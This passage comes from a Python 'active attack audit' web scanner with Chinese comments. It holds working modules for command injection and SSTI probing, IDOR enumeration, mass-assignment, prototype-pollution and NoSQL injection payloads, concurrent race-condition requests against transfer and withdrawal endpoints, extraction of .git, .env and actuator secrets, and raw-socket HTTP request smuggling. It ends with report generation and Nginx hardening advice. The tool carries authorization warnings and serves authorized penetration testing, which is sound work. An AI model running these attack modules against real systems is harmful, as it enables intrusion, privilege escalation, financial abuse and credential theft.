                                     "NoSQL", "CLI", "ready"]
                    if any(ip in ssrf_target for ip in ["127.0.0.1", "localhost", "10.", "192.168.", "172."]):
                        if any(s in resp.text.lower() for s in [s.lower() for s in internal_sigs]):
                            self._log_finding("ssrf", "HIGH",
                                              f"SSRF 内网服务可达: {ssrf_target}",
                                              f"端点: {endpoint}, 参数: {param}")

                    # 协议绕过
                    if ssrf_target.startswith(("file://", "gopher://", "dict://")):
                        if resp.status_code == 200:
                            self._log_finding("ssrf", "HIGH",
                                              f"SSRF 协议绕过: {ssrf_target[:30]}",
                                              f"端点: {endpoint}, 参数: {param}")

                    break  # 每参数只测前几个目标
                break  # 每端点只测前几个参数

    # ───────────────────────────────────────────────────────
    # 模块 7: 命令注入 + SSTI
    # ───────────────────────────────────────────────────────

    def attack_cmdi(self):
        """命令注入 + SSTI 探测"""
        print(f"\n{BOLD}[模块7] 命令注入 + SSTI 探测{RESET}")

        cmdi_params = ["cmd", "exec", "command", "execute", "ping",
                       "query", "jump", "code", "reg", "do",
                       "func", "arg", "option", "load", "process",
                       "search", "host", "ip", "domain", "name"]

        cmdi_endpoints = [
            "/api/exec", "/api/cmd", "/api/run", "/api/ping",
            "/api/system", "/api/shell", "/api/execute",
            "/api/tools", "/api/utils", "/api/debug",
            "/tools", "/debug", "/console",
        ]

        # Linux 特征字符串
        linux_signatures = ["uid=", "gid=", "root:", "nobody:", "bin/bash",
                            "/home/", "/bin/", "/usr/"]
        # Windows 特征字符串
        windows_signatures = ["Volume Serial", "Directory of", "Windows",
                              "Program Files", "system32"]

        for endpoint in cmdi_endpoints:
            url = self.target + endpoint
            probe = self._request("GET", url)
            if not probe or probe.status_code == 404:
                continue

            for param in cmdi_params[:5]:
                for payload in CMDI_PAYLOADS:
                    if self.skip_ids and ("sleep" in payload.lower() or "timeout" in payload.lower()):
                        continue

                    test_url = f"{url}?{param}={quote(payload)}"
                    resp = self._request("GET", test_url)

                    if not resp:
                        continue

                    # 命令执行特征
                    if any(sig in resp.text for sig in linux_signatures):
                        self._log_finding("cmdi", "CRITICAL",
                                          f"命令注入确认(Linux): {param}={payload[:30]}",
                                          f"端点: {endpoint}")
                        break
                    if any(sig in resp.text for sig in windows_signatures):
                        self._log_finding("cmdi", "CRITICAL",
                                          f"命令注入确认(Windows): {param}={payload[:30]}",
                                          f"端点: {endpoint}")
                        break

                    # SSTI 确认
                    if "{{7*7}}" in payload and "49" in resp.text:
                        self._log_finding("cmdi", "CRITICAL",
                                          f"SSTI 确认(Jinja2): {param}={{7*7}} → 49",
                                          f"端点: {endpoint}")
                        break
                    if "${7*7}" in payload and "49" in resp.text:
                        self._log_finding("cmdi", "CRITICAL",
                                          f"SSTI 确认(EL/SpEL): {param}=${{7*7}} → 49",
                                          f"端点: {endpoint}")
                        break

                    # 延时确认
                    if "sleep" in payload.lower() or "timeout" in payload.lower():
                        start = time.time()
                        self._request("GET", test_url)
                        if time.time() - start >= 3:
                            self._log_finding("cmdi", "HIGH",
                                              f"盲命令注入(延时确认): {param}={payload[:30]}",
                                              f"端点: {endpoint}")
                            break

                break  # 每端点只测一个参数子集

    # ───────────────────────────────────────────────────────
    # 模块 8: IDOR 探测
    # ───────────────────────────────────────────────────────

    def attack_idor(self):
        """IDOR (Insecure Direct Object Reference) 探测"""
        print(f"\n{BOLD}[模块8] IDOR 探测{RESET}")

        idor_patterns = [
            # (端点模式, 参数, 测试值序列)
            ("/api/user/{}", "path", [1, 2, 3, 100, 9999]),
            ("/api/users/{}", "path", [1, 2, 3]),
            ("/api/order/{}", "path", [1, 2, 3, 100, 9999]),
            ("/api/orders/{}", "path", [1, 2, 3]),
            ("/api/key/{}", "path", [1, 2, 3]),
            ("/api/keys/{}", "path", [1, 2, 3]),
            ("/api/message/{}", "path", [1, 2, 3]),
            ("/api/messages/{}", "path", [1, 2, 3]),
            ("/api/document/{}", "path", [1, 2, 3]),
            ("/api/invoice/{}", "path", [1, 2, 3]),
            ("/api/profile/{}", "path", [1, 2, 3]),
        ]

        for pattern, param_type, test_ids in idor_patterns:
            responses_by_id = {}
            for test_id in test_ids:
                url = self.target + pattern.format(test_id)
                resp = self._request("GET", url)
                if resp:
                    responses_by_id[test_id] = {
                        "status": resp.status_code,
                        "length": len(resp.text),
                        "snippet": resp.text[:200],
                    }

            # 分析: 如果不同 ID 返回不同内容且都是 200，可能存在 IDOR
            successful = {k: v for k, v in responses_by_id.items() if v["status"] == 200}
            if len(successful) >= 2:
                # 检查内容是否真的不同
                lengths = set(v["length"] for v in successful.values())
                if len(lengths) > 1:
                    details = ", ".join("id={}({}b)".format(k, v["length"]) for k, v in successful.items())
                    self._log_finding("idor", "HIGH",
                                      f"IDOR 疑似: {pattern}",
                                      f"不同 ID 返回不同内容: {details}")

            # UUID 枚举 — 如果端点接受 UUID
            if pattern.endswith("{}"):
                test_uuids = [
                    "00000000-0000-0000-0000-000000000000",
                    "ffffffff-ffff-ffff-ffff-ffffffffffff",
                ]
                for uuid_val in test_uuids:
                    url = self.target + pattern.format(uuid_val)
                    resp = self._request("GET", url)
                    if resp and resp.status_code == 200:
                        self._log_finding("idor", "MEDIUM",
                                          f"UUID 端点可枚举: {pattern}",
                                          f"UUID {uuid_val} 返回 200")

    # ───────────────────────────────────────────────────────
    # 模块 9: API 参数篡改
    # ───────────────────────────────────────────────────────

    def attack_param_tampering(self):
        """API 参数篡改攻击"""
        print(f"\n{BOLD}[模块9] API 参数篡改{RESET}")

        # 常见 API 端点
        api_endpoints = [
            "/api/user", "/api/users", "/api/profile",
            "/api/settings", "/api/config", "/api/keys",
            "/api/admin", "/api/role", "/api/permission",
        ]

        tampering_tests = [
            # (描述, 方法, 路径, body)
            ("角色提升: role=admin", "POST", "/api/user", {"role": "admin", "username": "test"}),
            ("角色提升: is_admin=true", "POST", "/api/user", {"is_admin": True, "username": "test"}),
            ("批量赋值: admin=true", "POST", "/api/user/register", {"username": "test", "password": "test", "admin": True}),
            ("批量赋值: is_admin=1", "POST", "/api/user/register", {"username": "test", "password": "test", "is_admin": 1}),
            ("原型污染: __proto__", "POST", "/api/user", {"__proto__": {"isAdmin": True}, "username": "test"}),
            ("原型污染: constructor", "POST", "/api/user", {"constructor": {"prototype": {"isAdmin": True}}}),
            ("类型混淆: id=数组", "GET", "/api/user?id[]=1&id[]=2", None),
            ("类型混淆: id=对象", "POST", "/api/user", {"id": {"$gt": ""}}),
            ("NoSQL 注入: $gt", "POST", "/api/user", {"username": {"$gt": ""}, "password": {"$gt": ""}}),
            ("NoSQL 注入: $ne", "POST", "/api/auth/login", {"username": {"$ne": ""}, "password": {"$ne": ""}}),
            ("NoSQL 注入: $regex", "POST", "/api/user", {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}),
            ("数组注入: 角色覆盖", "POST", "/api/user/register", {"username": "test", "password": "test", "role": ["user", "admin"]}),
        ]

        for desc, method, path, body in tampering_tests:
            url = self.target + path
            if method == "GET":
                resp = self._request("GET", url + (body if body else ""))
            else:
                resp = self._request("POST", url, json=body,
                                     headers={"Content-Type": "application/json"})

            if not resp:
                continue

            # 检查是否成功（不应该成功的操作返回 200）
            if resp.status_code == 200:
                # 排除正常的登录失败等
                fail_indicators = ["error", "invalid", "fail", "denied", "wrong", "exist"]
                if not any(ind in resp.text.lower() for ind in fail_indicators):
                    self._log_finding("param_tampering", "HIGH",
                                      f"参数篡改成功: {desc}",
                                      f"端点: {path}, 服务器返回 200 且无错误指示")
            elif resp.status_code == 500:
                self._log_finding("param_tampering", "MEDIUM",
                                  f"参数篡改导致 500: {desc}",
                                  f"端点: {path}, 可能存在未处理的输入")

    # ───────────────────────────────────────────────────────
    # 模块 10: 竞态条件
    # ───────────────────────────────────────────────────────

    def attack_race_condition(self):
        """竞态条件探测 — 并发请求导致状态不一致"""
        print(f"\n{BOLD}[模块10] 竞态条件探测{RESET}")

        race_targets = [
            # (描述, 方法, URL后缀, body)
            ("重复转账/扣费", "POST", "/api/transfer", {"amount": 1, "to": "attacker"}),
            ("重复优惠券使用", "POST", "/api/coupon/use", {"code": "TEST100"}),
            ("重复投票", "POST", "/api/vote", {"option": 1}),
            ("重复注册", "POST", "/api/user/register", {"username": "race_test", "password": "test123"}),
            ("重复密码重置", "POST", "/api/auth/reset", {"email": "test@test.com"}),
            ("重复提现", "POST", "/api/withdraw", {"amount": 100}),
            ("重复兑换", "POST", "/api/redeem", {"code": "GIFT100"}),
        ]

        CONCURRENT = 10  # 并发数

        for desc, method, path, body in race_targets:
            url = self.target + path

            # 先探测端点是否存在
            probe = self._request(method, url, json=body,
                                  headers={"Content-Type": "application/json"})
            if not probe:
                continue
            if probe.status_code == 404:
                continue

            # 并发攻击
            results = []
            barrier = threading.Barrier(CONCURRENT)

            def send_concurrent():
                barrier.wait()  # 同步起点
                resp = self._request(method, url, json=body,
                                     headers={"Content-Type": "application/json"})
                if resp:
                    results.append(resp.status_code)

            with ThreadPoolExecutor(max_workers=CONCURRENT) as pool:
                futures = [pool.submit(send_concurrent) for _ in range(CONCURRENT)]
                for f in as_completed(futures):
                    f.result()

            # 分析结果
            success_count = results.count(200)
            if success_count > 1:
                self._log_finding("race_condition", "HIGH",
                                  f"竞态条件疑似: {desc}",
                                  f"并发 {CONCURRENT} 请求中 {success_count} 个成功(200), "
                                  f"预期应只有 1 个成功")
            elif 500 in results:
                self._log_finding("race_condition", "MEDIUM",
                                  f"竞态导致 500: {desc}",
                                  f"并发请求导致服务器错误，可能缺乏锁机制")

    # ───────────────────────────────────────────────────────
    # 模块 11: 敏感信息提取 (主动)
    # ───────────────────────────────────────────────────────

    def attack_info_extraction(self):
        """主动敏感信息提取 — 不只是检测路径是否存在，而是提取内容"""
        print(f"\n{BOLD}[模块11] 敏感信息主动提取{RESET}")

        # Git 泄露 — 尝试还原仓库
        git_paths = ["/.git/HEAD", "/.git/config", "/.git/refs/heads/master",
                     "/.git/index", "/.git/logs/HEAD"]
        git_accessible = []

        for path in git_paths:
            url = self.target + path
            resp = self._request("GET", url)
            if resp and resp.status_code == 200:
                content = resp.text.strip()
                if path == "/.git/HEAD" and content.startswith("ref:"):
                    git_accessible.append(path)
                    self._log_finding("info_extraction", "CRITICAL",
                                      ".git 仓库泄露 — 可还原源码",
                                      f"HEAD: {content}, 使用 git-dumper 可完整还原")
                elif path == "/.git/config" and "[remote" in content:
                    git_accessible.append(path)
                    self._log_finding("info_extraction", "CRITICAL",
                                      ".git 配置泄露 — 远程仓库信息暴露",
                                      f"配置内容: {content[:200]}")
                elif resp.status_code == 200 and len(content) > 10:
                    git_accessible.append(path)

        # .env 文件 — 提取实际内容
        env_paths = ["/.env", "/.env.production", "/.env.local",
                     "/.env.development", "/.env.backup"]
        for path in env_paths:
            url = self.target + path
            resp = self._request("GET", url)
            if resp and resp.status_code == 200:
                # 区分真实 .env 和 SPA catch-all
                env_keywords = ["=", "DB_", "API_", "SECRET", "KEY",
                                "PASSWORD", "MONGO", "REDIS", "DATABASE"]
                content = resp.text
                keyword_hits = sum(1 for kw in env_keywords if kw in content.upper())

                if keyword_hits >= 2 and len(content) < 5000:
                    # 提取敏感变量名（脱敏值）
                    lines = content.strip().split("\n")
                    var_names = []
                    for line in lines:
                        if "=" in line and not line.startswith("#"):
                            var_name = line.split("=")[0].strip()
                            var_names.append(var_name)

                    self._log_finding("info_extraction", "CRITICAL",
                                      f".env 泄露: {path}",
                                      f"发现 {len(var_names)} 个环境变量: "
                                      f"{', '.join(var_names[:10])}")
                elif len(content) > 10000:
                    # 大文件 — 可能是 SPA shell
                    baseline_len = self.baseline_responses.get("404_baseline", {}).get("content_length", 0)
                    if abs(len(content) - baseline_len) < 500:
                        pass  # 和 404 页面一样，是 SPA catch-all
                    else:
                        self._log_finding("info_extraction", "MEDIUM",
                                          f"疑似信息泄露: {path}",
                                          f"响应 {len(content)} bytes，需人工确认")

        # Debug/Actuator 端点 — 提取配置
        debug_endpoints = {
            "/actuator/env": "Spring 环境变量",
            "/actuator/configprops": "Spring 配置属性",
            "/actuator/mappings": "Spring 路由映射",
            "/actuator/heapdump": "JVM 堆转储(可提取密码)",
            "/debug/vars": "Go 运行时变量",
            "/debug/pprof/goroutine": "Go goroutine 转储",
            "/jolokia/list": "JMX MBean 列表",
            "/api/status": "New-API/OneAPI 系统状态",
            "/api/setup": "New-API/OneAPI 初始化配置",
            "/telescope/requests": "Laravel Telescope 请求日志",
            "/_ignition/health-check": "Lavel Ignition 健康检查",
            "/swagger-ui.html": "Swagger API 文档",
            "/openapi.json": "OpenAPI 规范",
        }

        for path, desc in debug_endpoints.items():
            url = self.target + path
            resp = self._request("GET", url, timeout=15)
            if not resp or resp.status_code != 200:
                continue

            content = resp.text
            # 区分真实响应和 SPA catch-all
            baseline_len = self.baseline_responses.get("404_baseline", {}).get("content_length", 0)
            if baseline_len and abs(len(content) - baseline_len) < 500:
                continue  # SPA catch-all

            # 检查内容特征
            is_json = False
            try:
                parsed = json.loads(content)
                is_json = True
            except json.JSONDecodeError:
                pass

            sensitive_data = []
            if is_json:
                # 递归搜索 JSON 中的敏感键
                def find_sensitive(obj, path_str=""):
                    if isinstance(obj, dict):
                        for k, v in obj.items():
                            k_lower = k.lower()
                            if any(s in k_lower for s in ["secret", "key", "password",
                                                           "token", "credential", "private"]):
                                sensitive_data.append(f"{path_str}.{k}")
                            find_sensitive(v, f"{path_str}.{k}")
                    elif isinstance(obj, list):
                        for i, v in enumerate(obj):
                            find_sensitive(v, f"{path_str}[{i}]")

                find_sensitive(parsed)

            if sensitive_data:
                self._log_finding("info_extraction", "CRITICAL",
                                  f"{desc}泄露敏感字段: {path}",
                                  f"发现 {len(sensitive_data)} 个敏感字段: "
                                  f"{', '.join(sensitive_data[:5])}")
            elif len(content) > 200 and (is_json or "<" not in content[:50]):
                self._log_finding("info_extraction", "HIGH",
                                  f"{desc}可访问: {path}",
                                  f"响应 {len(content)} bytes, "
                                  f"{'JSON' if is_json else '非HTML'} 格式")

        # /api/status 专项 — New-API/OneAPI 常见泄露
        status_resp = self._request("GET", self.target + "/api/status")
        if status_resp and status_resp.status_code == 200:
            try:
                data = json.loads(status_resp.text)
                if isinstance(data, dict):
                    data_obj = data.get("data", data)
                    leak_fields = []
                    for field in ["github_client_id", "turnstile_site_key",
                                  "wechat_qrcode", "system_name", "logo",
                                  "footer_html", "notice", "chat_links",
                                  "top_up_link", "group"]:
                        if field in data_obj:
                            val = str(data_obj[field])
                            if val and val not in ["", "null", "undefined"]:
                                leak_fields.append(f"{field}={val[:50]}")

                    if leak_fields:
                        self._log_finding("info_extraction", "HIGH",
                                          "/api/status 配置泄露",
                                          f"未认证获取 {len(leak_fields)} 个配置项: "
                                          f"{'; '.join(leak_fields[:5])}")
            except json.JSONDecodeError:
                pass

    # ───────────────────────────────────────────────────────
    # 模块 12: HTTP 请求走私
    # ───────────────────────────────────────────────────────

    def attack_smuggling(self):
        """HTTP 请求走私探测"""
        print(f"\n{BOLD}[模块12] HTTP 请求走私探测{RESET}")

        # CL.TE 探测
        clte_payloads = [
            # CL.TE: 前端看 Content-Length, 后端看 Transfer-Encoding
            b"0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: " + self.domain.encode() + b"\r\n\r\n",
            b"0\r\n\r\nPOST /smuggled HTTP/1.1\r\nHost: " + self.domain.encode() + b"\r\nContent-Length: 10\r\n\r\n0123456789",
        ]

        # TE.CL 探测
        tecl_payloads = [
            # TE.CL: 前端看 Transfer-Encoding, 后端看 Content-Length
            b"5\r\n0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: " + self.domain.encode() + b"\r\n\r\n",
        ]

        # 简化版探测 — 发送含 CL+TE 的请求，观察响应
        test_payloads = [
            ("CL.TE", clte_payloads),
            ("TE.CL", tecl_payloads),
        ]

        for smuggle_type, payloads in test_payloads:
            for payload in payloads:
                try:
                    # 使用原始 socket 发送，因为 requests 库会规范化
                    import socket
                    import ssl

                    parsed = urlparse(self.target)
                    host = parsed.hostname
                    port = parsed.port or (443 if parsed.scheme == "https" else 80)

                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.timeout)

                    if parsed.scheme == "https":
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        sock = ctx.wrap_socket(sock, server_hostname=host)

                    sock.connect((host, port))

                    # 构造走私请求
                    body = payload
                    request_line = (
                        f"POST / HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"Transfer-Encoding: chunked\r\n"
                        f"Connection: close\r\n\r\n"
                    ).encode() + body

                    sock.sendall(request_line)

                    # 读取响应
                    response_data = b""
                    while True:
                        try:
                            chunk = sock.recv(4096)
                            if not chunk:
                                break
                            response_data += chunk
                        except socket.timeout:
                            break

                    sock.close()

                    # 分析响应
                    resp_text = response_data.decode("utf-8", errors="replace")

                    # 走私成功特征
                    smuggling_sigs = [
                        "smuggled",           # 我们的走私路径出现在响应中
                        "HTTP/1.1 200",       # 双重响应
                        "HTTP/1.1 400",       # 解析错误
                        "Content-Length: 0\r\n\r\nHTTP",  # 嵌套 HTTP 响应
                    ]

                    if "smuggled" in resp_text.lower():
                        self._log_finding("smuggling", "CRITICAL",
                                          f"HTTP 请求走私确认({smuggle_type})",
                                          f"走私请求在响应中可见")
                    elif resp_text.count("HTTP/1.1") > 1:
                        self._log_finding("smuggling", "HIGH",
                                          f"HTTP 请求走私疑似({smuggle_type})",
                                          f"响应中包含多个 HTTP 状态行")
                    elif "400 Bad Request" in resp_text and "Transfer-Encoding" in resp_text:
                        self._log_finding("smuggling", "MEDIUM",
                                          f"服务器可能受 CL/TE 歧义影响({smuggle_type})",
                                          f"同时发送 CL+TE 时返回 400")

                except Exception as e:
                    pass  # 连接失败，跳过

    # ───────────────────────────────────────────────────────
    # 附加: 敏感路径全量扫描
    # ───────────────────────────────────────────────────────

    def scan_sensitive_paths(self):
        """全量敏感路径扫描 — 提取内容而非仅检测存在"""
        print(f"\n{BOLD}[预扫描] 敏感路径主动扫描{RESET}")

        all_paths = []
        for category, paths in SENSITIVE_PATHS.items():
            all_paths.extend(paths)

        baseline_len = self.baseline_responses.get("404_baseline", {}).get("content_length", 0)

        def scan_path(path):
            url = self.target + path
            resp = self._request("GET", url, timeout=8)
            if not resp:
                return

            # 过滤 SPA catch-all
            if baseline_len and abs(len(resp.text) - baseline_len) < 300:
                return

            if resp.status_code in [200, 301, 302, 403]:
                # 403 也值得关注 — 说明路径存在但禁止访问
                status = resp.status_code
                content_len = len(resp.text)
                is_json = False
                try:
                    json.loads(resp.text)
                    is_json = True
                except json.JSONDecodeError:
                    pass

                # 确定类别
                category = "unknown"
                for cat, paths in SENSITIVE_PATHS.items():
                    if path in paths:
                        category = cat
                        break

                endpoint_info = {
                    "url": url,
                    "path": path,
                    "status_code": status,
                    "content_length": content_len,
                    "category": category,
                    "is_json": is_json,
                    "methods": ["GET"],  # 后续补充
                }
                with self._lock:
                    self.discovered_endpoints.append(endpoint_info)

                # 发现实时输出
                color = RED if status == 200 else YELLOW
                print(f"  {color}[{status}]{RESET} {path} → {content_len} bytes"
                      f"{' (JSON)' if is_json else ''}")

                # 特别关注的关键发现
                if status == 200 and category == "version_control":
                    self._log_finding("path_scan", "CRITICAL",
                                      f"版本控制泄露: {path}",
                                      f"可能暴露完整源代码")
                elif status == 200 and category == "config_leak" and content_len < 5000:
                    self._log_finding("path_scan", "HIGH",
                                      f"配置文件可能泄露: {path}",
                                      f"响应 {content_len} bytes, 需确认是否为真实配置")
                elif status == 403:
                    self._log_finding("path_scan", "LOW",
                                      f"路径存在但禁止访问: {path}",
                                      f"状态码 403, 可尝试绕过")

        # 并发扫描
        with ThreadPoolExecutor(max_workers=10) as pool:
            futures = [pool.submit(scan_path, path) for path in all_paths]
            for f in as_completed(futures):
                f.result()

        print(f"  发现 {len(self.discovered_endpoints)} 个有效端点")

    # ───────────────────────────────────────────────────────
    # 主运行器
    # ───────────────────────────────────────────────────────

    def run(self, only_modules=None):
        """执行完整攻击流程"""
        start_time = time.time()

        print(f"\n{'='*60}")
        print(f"{BOLD}  Web 主动攻击审计{RESET}")
        print(f"  目标: {self.target}")
        print(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*60}")

        # 授权声明
        print(f"\n{YELLOW}⚠️  请确认您拥有目标系统的合法授权！{RESET}")
        print(f"    仅限 CTF / 自有系统 / 书面授权的渗透测试\n")

        # 授权执行检查
        if not self.i_am_authorized:
            print(f"{YELLOW}[!] 未设置 --i-am-authorized，已禁用高危模块 (ssrf/cmdi/auth_bypass/smuggling){RESET}\n")

        # 阶段 0: 基线
        self.establish_baseline()

        # 预扫描: 路径发现
        self.scan_sensitive_paths()

        # 攻击模块
        modules = [
            ("sqli", self.attack_sqli),
            ("xss", self.attack_xss),
            ("path_traversal", self.attack_path_traversal),
            ("cors", self.attack_cors),
            ("auth_bypass", self.attack_auth_bypass),
            ("ssrf", self.attack_ssrf),
            ("cmdi", self.attack_cmdi),
            ("idor", self.attack_idor),
            ("param_tampering", self.attack_param_tampering),
            ("race_condition", self.attack_race_condition),
            ("info_extraction", self.attack_info_extraction),
            ("smuggling", self.attack_smuggling),
        ]

        # 未经授权时过滤高危模块
        if not self.i_am_authorized:
            high_risk = {"ssrf", "cmdi", "auth_bypass", "smuggling"}
            modules = [(name, func) for name, func in modules if name not in high_risk]

        if only_modules:
            only_set = set(m.strip() for m in only_modules.split(","))
            modules = [(name, func) for name, func in modules if name in only_set]

        for name, func in modules:
            try:
                func()
            except Exception as e:
                print(f"  {RED}[ERROR]{RESET} 模块 {name} 异常: {str(e)[:100]}")

        elapsed = time.time() - start_time

        # 生成报告
        self._generate_report(elapsed)

    # ───────────────────────────────────────────────────────
    # 报告生成
    # ───────────────────────────────────────────────────────

    def _generate_report(self, elapsed):
        """生成分级攻击报告"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_domain = re.sub(r'[^\w]', '_', self.domain)
        report_file = f"web_attack_report_{safe_domain}_{timestamp}.md"
        raw_file = f"web_attack_raw_{safe_domain}_{timestamp}.json"

        # 按严重性排序
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        sorted_findings = sorted(self.findings,
                                 key=lambda f: severity_order.get(f["severity"], 5))

        # 统计
        stats = {}
        for f in self.findings:
            stats[f["severity"]] = stats.get(f["severity"], 0) + 1

        # Markdown 报告
        lines = [
            f"# Web 主动攻击审计报告",
            f"",
            f"- **目标**: {self.target}",
            f"- **时间**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"- **耗时**: {elapsed:.1f}s",
            f"- **发现总数**: {len(self.findings)}",
            f"",
            f"## 发现总览",
            f"",
            f"| 严重性 | 数量 |",
            f"|--------|------|",
        ]
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            if sev in stats:
                emoji = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢", "INFO": "ℹ️"}
                lines.append(f"| {emoji.get(sev, '')} {sev} | {stats[sev]} |")

        lines.extend([
            f"",
            f"## 详细发现",
            f"",
        ])

        current_severity = None
        for f in sorted_findings:
            if f["severity"] != current_severity:
                current_severity = f["severity"]
                lines.append(f"\n### {current_severity}\n")

            lines.append(f"**[{f['module']}]** {f['title']}")
            if f.get("detail"):
                lines.append(f"- {f['detail']}")
            if f.get("request"):
                req = f["request"]
                lines.append(f"- 请求: `{req['method']} {req['url'][:100]}`")
            if f.get("response"):
                resp = f["response"]
                lines.append(f"- 响应: `{resp['status_code']} / {resp.get('content_length', '?')} bytes`")
            lines.append("")

        # 已发现端点
        if self.discovered_endpoints:
            lines.extend([
                f"\n## 发现的端点 ({len(self.discovered_endpoints)})",
                f"",
                f"| 路径 | 状态 | 大小 | 类型 |",
                f"|------|------|------|------|",
            ])
            for ep in sorted(self.discovered_endpoints, key=lambda e: e.get("path", "")):
                lines.append(
                    f"| `{ep['path']}` | {ep['status_code']} | "
                    f"{ep['content_length']} | "
                    f"{'JSON' if ep.get('is_json') else 'HTML'} |"
                )

        # 安全响应头状态
        lines.extend([
            f"\n## 安全响应头检查",
            f"",
        ])
        home_headers = self.baseline_responses.get("home", {}).get("headers", {})
        security_headers = [
            "Strict-Transport-Security", "Content-Security-Policy",
            "X-Frame-Options", "X-Content-Type-Options",
            "Referrer-Policy", "Permissions-Policy",
        ]
        for h in security_headers:
            val = home_headers.get(h, home_headers.get(h.lower(), "❌ 未设置"))
            status = "✅" if val != "❌ 未设置" else "❌"
            lines.append(f"- {status} `{h}`: {val}")

        # 修复建议
        lines.extend([
            f"\n## 快速修复建议",
            f"",
        ])

        if stats.get("CRITICAL", 0) > 0 or stats.get("HIGH", 0) > 0:
            lines.extend([
                f"### 立即修复 (🔴🟠)",
                f"",
            ])
            for f in sorted_findings:
                if f["severity"] in ["CRITICAL", "HIGH"]:
                    lines.append(f"- **{f['title']}**: {f.get('detail', '')}")

        lines.extend([
            f"",
            f"### Nginx 通用加固",
            f"",
            f"```nginx",
            f"server {{",
            f"    server_tokens off;",
            f"    proxy_hide_header X-Powered-By;",
            f"    proxy_hide_header Server;",
            f"",
            f"    add_header Strict-Transport-Security 'max-age=31536000; includeSubDomains; preload' always;",
            f"    add_header X-Content-Type-Options 'nosniff' always;",
            f"    add_header X-Frame-Options 'DENY' always;",
            f"    add_header Referrer-Policy 'strict-origin-when-cross-origin' always;",
            f"    add_header Permissions-Policy 'camera=(), microphone=(), geolocation=()' always;",
            f"",
            f"    # 精确 CORS (替换通配符)",
            f"    set $cors_origin '';",
            f"    if ($http_origin ~* '^https://(your-domain\\.com)$') {{",
            f"        set $cors_origin $http_origin;",
            f"    }}",
            f"    add_header Access-Control-Allow-Origin $cors_origin always;",
            f"",
            f"    # 屏蔽敏感路径",
            f"    location ~ ^/(\\.git|\\.env|admin|console|swagger|graphql|debug|actuator|phpinfo) {{",
            f"        return 404;",
            f"    }}",
            f"}}",
            f"```",
        ])

        # 写入文件
        report_content = "\n".join(lines)
        with open(report_file, "w", encoding="utf-8") as f:
            f.write(report_content)

        # 原始 JSON
        with open(raw_file, "w", encoding="utf-8") as f:
            json.dump({
                "target": self.target,
                "timestamp": datetime.now().isoformat(),
                "elapsed_seconds": elapsed,
                "findings": self.findings,
                "discovered_endpoints": self.discovered_endpoints,
                "baseline": self.baseline_responses,
            }, f, ensure_ascii=False, indent=2)

        # 终端摘要
        print(f"\n{'='*60}")
        print(f"{BOLD}  审计完成{RESET}")
        print(f"  耗时: {elapsed:.1f}s")
        print(f"  发现: {len(self.findings)} 个")
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            if sev in stats:
                color = {"CRITICAL": RED, "HIGH": RED, "MEDIUM": YELLOW,
                         "LOW": CYAN, "INFO": RESET}.get(sev, RESET)
                print(f"  {color}{sev}: {stats[sev]}{RESET}")
        print(f"\n  报告: {report_file}")
        print(f"  原始: {raw_file}")
        print(f"{'='*60}")


# ═══════════════════════════════════════════════════════════════
# CLI 入口
# ═══════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="Web 主动攻击审计脚本 — 主动探测而非被动检查",
        epilog="⚠️  仅对授权目标使用。CTF / 自有系统 / 书面授权的渗透测试。"
    )
    parser.add_argument("--i-am-authorized", action="store_true",
                        help="我确认拥有目标系统的合法授权（开启全部主动攻击模块）")
    parser.add_argument("target", help="目标 URL (如 https://api.target.cn)")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数 (默认 10)")
    parser.add_argument("--proxy", help="代理地址 (如 http://127.0.0.1:8080)")
    parser.add_argument("--auth", help="认证 Header (如 'Bearer eyJ...')")
    parser.add_argument("--depth", type=int, default=1, help="扫描深度 (默认 1)")
    parser.add_argument("--skip-ids", action="store_true",
                        help="跳过可能触发 IDS/WAF 的载荷 (时间盲注等)")
    parser.add_argument("--only", help="只运行指定模块 (逗号分隔，如 sqli,xss,ssrf)")
    parser.add_argument("--verify-ssl", action="store_true", help="验证 SSL 证书")
    parser.add_argument("--output-dir", help="报告输出目录 (默认当前目录)")

    args = parser.parse_args()

    # 切换输出目录
    if args.output_dir:
        import os
        os.makedirs(args.output_dir, exist_ok=True)
        os.chdir(args.output_dir)

    attacker = WebAttacker(
        target_url=args.target,
        timeout=args.timeout,
        proxy=args.proxy,
        auth_header=args.auth,
        depth=args.depth,
        skip_ids=args.skip_ids,
        verify_ssl=args.verify_ssl,
        i_am_authorized=args.i_am_authorized,
    )

    attacker.run(only_modules=args.only)


if __name__ == "__main__":
    main()
